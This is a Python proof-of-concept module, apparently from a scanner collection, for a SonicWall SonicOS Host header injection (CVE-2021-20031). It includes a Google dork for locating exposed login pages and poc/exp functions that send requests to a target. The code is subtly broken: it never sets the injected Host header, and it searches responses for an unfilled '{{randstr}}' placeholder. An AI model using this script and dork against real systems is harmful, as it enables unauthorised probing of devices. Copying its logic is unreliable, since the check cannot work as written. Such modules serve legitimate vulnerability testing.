import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Sonicwall SonicOS 7.0 - Host Header Injection''',
        "description": '''A Host Header Injection vulnerability may allow an attacker to spoof a particular Host header, allowing the attacker to render arbitrary links that point to a malicious website with poisoned Host header webpages. An issue was discovered in Sonicwall NAS, SonicWall Analyzer version 8.5.0 (may be affected on other versions too). The values of the 'Host' headers are implicitly set as trusted while this should be forbidden, leading to potential host header injection attack and also the affected hosts can be used for domain fronting. This means affected hosts can be used by attackers to hide behind during various other attack''',
        "severity": "medium",
        "references": [
            "https://www.exploit-db.com/exploits/50414", 
            "https://nvd.nist.gov/vuln/detail/CVE-2021-20031"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            "cvss-score": "",
            "cve-id": "CVE-2021-20031",
            "cwe-id": "CWE-601"
        },
        "metadata":{
            "vuln-target": "",
            "google-dork":'''inurl:"auth.html" intitle:"SonicWall"'''
        },
        "tags": ["cve", "cve2021", "sonicwall", "redirect"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/"""
        method = "GET"
        data = """"""
        headers = {}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""https://{{randstr}}.tld/auth.html""" in resp0.text and """Please be patient as you are being re-directed""" in resp0.text) and (resp0.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url